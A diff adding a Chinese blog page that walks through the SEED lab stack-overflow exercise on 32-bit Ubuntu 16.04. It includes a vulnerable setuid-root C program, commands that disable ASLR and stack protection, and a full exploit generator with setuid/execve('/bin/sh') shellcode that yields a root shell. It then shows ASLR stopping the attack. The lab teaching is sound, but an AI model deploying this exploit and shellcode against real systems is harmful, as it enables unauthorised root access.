@@ -1,0 +1,973 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.4">
+    
+    
+      
+        <title>缓冲区溢出攻击 - 王天龙的博客</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.bb3983ee.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="王天龙的博客" class="md-header__button md-logo" aria-label="王天龙的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            王天龙的博客
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              缓冲区溢出攻击
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="王天龙的博客" class="md-nav__button md-logo" aria-label="王天龙的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    王天龙的博客
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        首页
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          c&c++
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="c&c++" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          c&c++
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../c_cpp/2021_02_06_cpp_function_default_parameters/" class="md-nav__link">
+        C++的缺省函数到底是在声明中确定还是在定义中确定
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../c_cpp/2021_02_20_cpp_static/" class="md-nav__link">
+        C++关键字static总结
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../c_cpp/2021_02_23_cpp_map_reference/" class="md-nav__link">
+        C++ Map使用汇总
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../c_cpp/2022_01_05_rvalue/" class="md-nav__link">
+        右值引用和move语义
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          leetcode
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="leetcode" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          leetcode
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../leetcode/2021_02_21_leetcode_n_queens/" class="md-nav__link">
+        N皇后的位运算解法
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../leetcode/2021_03_20_n_factorial_zeros/" class="md-nav__link">
+        n的阶乘结果后面有多少个0
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../leetcode/2021_03_22_leetcode_valid_number/" class="md-nav__link">
+        有效数字
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          操作系统
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="操作系统" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          操作系统
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          缓冲区溢出攻击
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        缓冲区溢出攻击
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    实验平台
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    堆栈溢出原理
+  </a>
+  
+    <nav class="md-nav" aria-label="堆栈溢出原理">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    程序的内存布局
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    实现栈溢出攻击
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    对于栈溢出的保护措施
+  </a>
+  
+    <nav class="md-nav" aria-label="对于栈溢出的保护措施">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    地址空间随机化
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    不可执行栈
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stack-guard" class="md-nav__link">
+    Stack Guard
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    结束语
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    参考
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2021_06_12_can_a_thread_access_the_stack_of_other_threads/" class="md-nav__link">
+        一个线程能访问另一个线程的栈吗
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    实验平台
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    堆栈溢出原理
+  </a>
+  
+    <nav class="md-nav" aria-label="堆栈溢出原理">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    程序的内存布局
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    实现栈溢出攻击
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    对于栈溢出的保护措施
+  </a>
+  
+    <nav class="md-nav" aria-label="对于栈溢出的保护措施">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    地址空间随机化
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    不可执行栈
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stack-guard" class="md-nav__link">
+    Stack Guard
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    结束语
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    参考
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+<h1 id="_1">缓冲区溢出攻击</h1>
+<p>缓冲区溢出(buffer-overflow)是一种非常普遍、同时非常危险的漏洞，在各种操作系统、应用软件中广泛存在。缓冲区溢出攻击是利用缓冲区溢出漏洞所进行的攻击，轻则可以导致程序失败、系统关机等，重则可以利用它执行非授权指令，甚至获取系统特权，从而进行其它的非法操作。缓冲区攻击有栈溢出、堆溢出、格式化字符串漏洞、整形变量溢出等。本文将主要介绍堆栈溢出攻击，并实现对一个ubuntu 16.04系统的简单的栈攻击，获取其root权限。</p>
+<h3 id="_2">实验平台</h3>
+<p>操作系统：SEED Ubuntu16.04 VM (32-bit)，镜像下载地址：https://seedsecuritylabs.org/lab_env.html</p>
+<p>虚拟机：Oracle VM VirtualBox 6.0.4</p>
+<h3 id="_3">堆栈溢出原理</h3>
+<p>在计算机里，堆栈是内存里的一段区域。堆一般由程序员分配释放，如果程序员不释放，程序结束时可能由操作系统回收，分配方式类似于数据结构中的链表；栈由操作系统自动分配释放，存放函数的参数值、局部变量、返回地址等，分配方式类似于数据结构中的栈。以堆栈溢出为代表的缓冲区溢出已经成为最普遍的安全漏洞，由此引发的安全问题比比皆是。堆栈溢出的原因一般有以下几种：</p>
+<ol>
+<li>函数调用层次太深。函数递归调用时，系统要在栈中不断保存函数调用时的现场和产生的变量，如果递归调用太深，就会造成栈溢出，这时递归无法返回。再有，当函数调用层次过深时也可能导致栈无法容纳这些调用的返回地址而造成栈溢出。</li>
+<li>动态申请空间使用之后没有释放。由于C语言中没有垃圾资源自动回收机制，因此，需要程序主动释放已经不再使用的动态地址空间。申请的动态空间使用的是堆空间，动态空间使用不会造成堆溢出。</li>
+<li>数组访问越界。C语言没有提供数组下标越界检查，如果在程序中出现数组下标访问超出数组范围，在运行过程中可能会内存访问错误。</li>
+<li>指针非法访问。指针保存了一个非法的地址，通过这样的指针访问所指向的地址时会产生内存访问错误。</li>
+</ol>
+<p>在一些高级语言中，类似python, java, go等，有一些机制用于防止栈溢出，比如，python默认的递归深度是1000，当递归调用超过这个深度后就会引发异常。此外，编译器层面上也有对堆栈进行保护，其中最著名的是Stack Guard和Stack-smashing Protectection。在操作系统的层面上，为了减少堆栈溢出带来的危害，还有类似于地址空间随机化的机制。</p>
+<h4 id="_4">程序的内存布局</h4>
+<p>为了进一步了解堆栈溢出的工作原理，首先来了解一个进程的内存是如何分配的。对于一个典型的C语言程序，其运行时，内存由5个短组成，分别为代码段（text segment），数据段（data segment），BSS段（BSS segment），堆（heap），栈（stack），这5个段在内存中分布如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p1.png" alt="yQze0I.png" style="zoom:80%;"/></p>
+<p>代码段中存放程序的代码；数据段中存放着由程序员初始化的静态/全局变量，例如，<code>stack int a=3;</code>中的<code>a</code>变量；BSS段中存放着未初始化的静态/全局变量，例如，<code>stack int b;</code>中的<code>b</code>变量；堆是动态分配的内存，c语言中，<code>malloc</code>、<code>calloc</code>等函数用于申请动态内存，<code>free</code>函数用于释放，在途中是向上增长；栈则存放函数内定义的局部变量、函数返回地址、函数参数等，在图中是向下增长。注意，在现在的操作系统中，这几个段不一定是连在一起的。</p>
+<p>这次我们实现的是栈溢出攻击，所以我们具体看一下一个函数在栈里面的数据的分布，以及一个函数是如何被调用的，以<span id="c">一个简单的c语言程序</span>为例</p>
+<pre><code class="language-c">/* fun.c */
+#include&lt;stdio.h&gt;
+int fun(int a, int b) {
+    int l[3];
+    l[0] = a;
+    l[1] = b;
+    l[2] = a + b;
+}
+int main() {
+    fun(1, 2);
+}
+</code></pre>
+<p>先用gcc对程序进行编译</p>
+<pre><code class="language-shell">gcc -g -fno-stack-protector fun.c -o fun
+</code></pre>
+<p>在使用gdb对fun程序进行调试，首先反汇编<code>main</code>函数，看一下是如何调用<code>fun</code>函数的</p>
+<pre><code class="language-shell">gdb fun
+
+disass main
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p2.png" alt="p1" style="zoom:80%;" /></p>
+<p>从&lt;+3&gt;到&lt;+12&gt;就是一个完整的函数调用过程。可以看到，调用<code>fun</code>函数时，首先通过&lt;+3&gt;和&lt;+5&gt;两条指令把函数参数压进栈里，然后使用<code>call</code>指令跳转执行，而一条<code>call</code>指令会先把eip寄存器的内容压进栈，然后跳转到被调用函数里执行，eip寄存器里存放着<code>call</code>指令的下一条指令的地址，也就是函数的返回地址，即一条<code>call</code>指令相当于</p>
+<pre><code class="language-asm">push eip ; 此时eip寄存器里的值是指令&lt;+12&gt;的地址
+jmp 0x80484db ; fun函数的起始地址
+</code></pre>
+<p>顺利从<code>fun</code>函数返回后，指令&lt;+12&gt;的作用清空栈里传给函数的参数。</p>
+<p>然后对<code>fun</code>函数进行反汇编，看一下<code>fun</code>函数里的局部变量是如何分布的，以及如何返回到<code>main</code>函数，结果如<span id="fun1">下图</span>所示</p>
+<pre><code class="language-shell">disass fun
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p3.png" alt="yQzKtf.png" style="zoom:70%;" /></p>
+<p>在函数的开头，首先是&lt;+0&gt;和&lt;+1&gt;两条指令对ebp寄存器的操作，ebp寄存器又叫基址指针(extended base pointer)寄存器。函数的局部变量、参数等是保存在栈里的，而在函数运行时，栈指针寄存器esp的值会发生改变，所以无法通过esp访问到这些变量和参数，因此引入了ebp寄存器，保存着栈中的一个固定的地址，通过计算相对于该地址的偏移量即可访问到变量和参数。在32位系统中，一个int类型、返回地址、寄存器大小都是4个字节。此外由<code>main</code>函数的汇编代码可以看到是参数<code>b</code>先进栈(指令&lt;+3&gt;)，再是参数<code>a</code>进栈。因此，指令&lt;+6&gt;中[ebp+0x8]访问的是参数<code>a</code>，由此可以推断指令&lt;+9&gt;中[ebp-0xc]访问的是<code>l[0]</code>，两条汇编指令对应的c代码是<code>l[0] = a</code>。指令&lt;+12&gt;到&lt;+29&gt;分析也是类似的。</p>
+<p>指令&lt;+30&gt;和&lt;+31&gt;是从<code>fun</code>函数返回<code>main</code>函数的过程。<code>leave</code>指令相当于<code>mov esp,ebp</code>和<code>pop ebp</code>，即恢复了进入<code>fun</code>函数时ebp和esp寄存器的值，而<code>ret</code>指令相当于<code>pop eip</code>，即把栈中的函数返回地址弹出，放入eip寄存器中，实现返回到<code>main</code>函数。</p>
+<p>通过上述分析，我们可以获知<code>fun</code>函数的栈分布如下图所示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p4 (2).png" alt="p1" style="zoom:90%;" /></p>
+<p>从图中就可以大致看到进行栈溢出攻击的一种方式，即越过数组<code>l</code>的边界去修改函数返回地址，从而跳转到一段恶意代码去执行，即类似<code>l[4]=somewhere</code>。在c语言中，类似<code>strcpy</code>函数等是没有边界检查的，所以我们可以通过<code>strcpy</code>函数向一个字符串数组拷贝超过其大小的内容，从而修改函数返回地址，这也是我们稍后实现的栈溢出攻击的原理。</p>
+<pre><code class="language-c">// 向buf拷贝超过其大小的内容。
+#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+int main() {
+    char buf[3];
+    char *s=&quot;hello,world&quot;;
+    strcpy(buf,s);
+}
+</code></pre>
+<p>这个攻击的思路就是，首先在内存中放置一段可以获取root权限恶意代码，然后利用<code>strcpy</code>没有边界检查的特点造成栈溢出修改函数的返回地址，跳转到恶意代码执行。</p>
+<h3 id="_5">实现栈溢出攻击</h3>
+<p>为防止缓冲区溢出漏洞，已经出现了多种保护机制。为了实现这次攻击，我们需要停用一些保护机制，具体是：地址空间随机化 (Address Randomization)、不可执行栈 (Non-executable Stack)、Stack Guard。</p>
+<p>假设有一个具有栈溢出漏洞的程序如下：</p>
+<pre><code class="language-c">/* stack.c */
+
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int bof(char *str)
+{
+    char buffer[24];
+
+    /* 这里存在栈溢出的危险 */
+    strcpy(buffer, str);
+
+    return 1;
+}
+
+int main(int argc, char **argv)
+{
+    char str[517];
+    FILE *badfile;
+
+    badfile = fopen(&quot;badfile&quot;, &quot;r&quot;);
+    fread(str, sizeof(char), 517, badfile);
+    bof(str);
+
+    printf(&quot;Returned Properly\n&quot;);
+    return 1;
+}
+</code></pre>
+<p>对上述文件进行编译，注意要停用一些保护机制</p>
+<p>禁止地址空间随机化</p>
+<pre><code class="language-shell">su root
+sysctl -w kernel.randomize_va_space=0
+exit
+</code></pre>
+<p>使用gcc进行编译</p>
+<pre><code class="language-shell">su root
+gcc -g -fno-stack-protector -z execstack stack.c -o stack
+chmod 4755 stack
+exit
+</code></pre>
+<p><code>-fon-stack-protector</code>选项是关闭gcc的Stack Guard；<code>-z execstack</code>选项；最后的<code>chmod 4755 stack</code>是让其它用户在执行stack程序时，拥有和所有者(root)相当的权限（这样的程序是存在的），这样可以使恶意代码中的<code>setuid</code>指令可以执行。</p>
+<p>攻击的具体思路是：精心设计badfile的内容，让其包含一段可以获取root权限的代码，这段代码会被读到stack的<code>str</code>中，再拷贝到<code>bof</code>函数的<code>buffer</code>里，只要badfile里的内容够多，就会突破<code>buffer</code>的边界，从而覆盖掉<code>bof</code>函数的返回地址，控制函数返回到恶意代码里执行。</p>
+<p>首先，使用gdb对stack进行分析</p>
+<pre><code class="language-shell">gdb stack
+</code></pre>
+<p>查看<code>str</code>的地址</p>
+<pre><code class="language-shell">b main     # 设置断点
+r          # 运行
+p /x &amp;str  # 参考str的地址
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p5.png" alt="p1" style="zoom:120%;" /></p>
+<p>我们的恶意代码最终会插入到0xbfffea37开始517个字节的内存里。</p>
+<p>然后查看<code>bof</code>的<code>buffer</code>地址，以及存放返回地址的位置</p>
+<p>先运行到<code>bof</code>函数里，再查看<code>bof</code>的汇编代码</p>
+<pre><code class="language-shell">b bof
+r
+disass bof
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p6.png" alt="p1" style="zoom:80%;" /></p>
+<p>可以看到，此时程序已经运行到指令&lt;+6&gt;，由之前的分析可以得知，此时寄存器ebp里的值加上4就是返回地址的存放地址了。查看ebp寄存器的值</p>
+<pre><code class="language-shell">p /x $ebp
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p7.png" alt="p1" style="zoom:120%;" /></p>
+<p>再查看<code>buffer</code>的地址</p>
+<pre><code class="language-shell">p /x &amp;buffer
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p8.png" alt="p1" style="zoom:120%;" /></p>
+<p>因此，返回地址的位置和<code>buffer</code>首地址相距0xbfffea18+4-0xbfffe9f8=0x24，即<code>buffer[0x24]</code>就可以访问到返回地址。</p>
+<p>通过上述分析，恶意代码在<code>str</code>里。所以，在<code>bof</code>函数里，要修改<code>buffer[0x24]</code>处的内容为恶意代码的入口。为了增大攻击成功的可能性，我们在<code>str</code>首地址到恶意代码的入口之前填充<code>NOP</code>指令，该指令不进行任何操作。填充<code>NOP</code>可以再跳转 ”不那么精确“ 的时候，也会 “滑” 到恶意代码的入口，即假设恶意代码插入到<code>str[400]</code>处，只要跳转到<code>str[0]</code>和<code>str[400]</code>之间都可以成功实现攻击。</p>
+<p>下面是一个生成我们精心设计的badfile程序，将恶意代码插入到<code>str[400]</code>处开始的地方，然后控制<code>bof</code>函数跳转到0xbfffeb95 （大概在<code>str[350]</code>处）</p>
+<pre><code class="language-c">/* exploit.c */
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+// 恶意代码
+char shellcode[]=
+    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
+    &quot;\x31\xdb&quot;             /* xorl    %ebx,%ebx              */
+    &quot;\xb0\xd5&quot;             /* movb    $0xd5,%al              */
+    &quot;\xcd\x80&quot;             /* int     $0x80                  */
+    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
+    &quot;\x50&quot;                 /* pushl   %eax                   */
+    &quot;\x68&quot;&quot;//sh&quot;           /* pushl   $0x68732f2f            */
+    &quot;\x68&quot;&quot;/bin&quot;           /* pushl   $0x6e69622f            */
+    &quot;\x89\xe3&quot;             /* movl    %esp,%ebx              */
+    &quot;\x50&quot;                 /* pushl   %eax                   */
+    &quot;\x53&quot;                 /* pushl   %ebx                   */
+    &quot;\x89\xe1&quot;             /* movl    %esp,%ecx              */
+    &quot;\x99&quot;                 /* cdq                            */
+    &quot;\xb0\x0b&quot;             /* movb    $0x0b,%al              */
+    &quot;\xcd\x80&quot;             /* int     $0x80                  */
+;
+
+void main(int argc, char **argv)
+{
+    char buffer[517];
+    FILE *badfile;
+
+    /* 使用NOP填充 */
+    memset(&amp;buffer, 0x90, 517);
+
+    strcpy(buffer+400, shellcode);  /* 恶意代码将插入到str[400]处开始的地方 */
+    strcpy(buffer+0x24, &quot;\x95\xeb\xff\xbf&quot;);  /* 控制bof函数返回到0xbfffeb95处，注意要倒序 */
+
+    /* 生成badfile文件 */
+    badfile = fopen(&quot;./badfile&quot;, &quot;w&quot;);
+    fwrite(buffer, 517, 1, badfile);
+    fclose(badfile);
+}
+
+</code></pre>
+<p>编译、运行exploit.c</p>
+<pre><code class="language-shell">gcc exploit.c -o exploit
+./exploit
+</code></pre>
+<p>此时生成了badfile。</p>
+<p>为了体现root权限有无，普通用户尝试修改/etc/passwd文件，执行<code>vim /etc/passwd</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p10.png" alt="p1" style="zoom:80%;" /></p>
+<p>运行stack程序，就会进入到一个具有sudo权限的sh程序里。</p>
+<pre><code>./stack
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p9.png" alt="p1" style="zoom:120%;" /></p>
+<p>在这个sh里，可以对受保护文件进行修改，例如<code>vim /etc/passwd</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p11.png" alt="p1" style="zoom:80%;" /></p>
+<p>可见，成功地获取了系统的root权限。</p>
+<h3 id="_6">对于栈溢出的保护措施</h3>
+<p>在进行实验时，我们停用了几个保护措施，现在我们来探讨一下这些保护措施是如何抵御栈溢出攻击的。</p>
+<h4 id="_7">地址空间随机化</h4>
+<p>地址空间随机化，顾名思义，程序每次加载到的内存位置是随机的，所以，即使可以利用栈溢出控制函数的返回地址，但是无法确定恶意代码的位置，因此，可以有效地防范栈溢出攻击。</p>
+<p>现在我们开启地址空间随机化再进行重复上述攻击</p>
+<pre><code class="language-shell">su root
+sysctl -w kernel.randomize_va_space=2
+exit
+./stack
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p12.png" alt="p1" style="zoom:80%;" /></p>
+<p>使用gdb查看<code>str</code>的地址，发现已经不是原来的0xbfffea37了，攻击失败时显然易见的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p13.png" alt="p1" style="zoom:120%;" /></p>
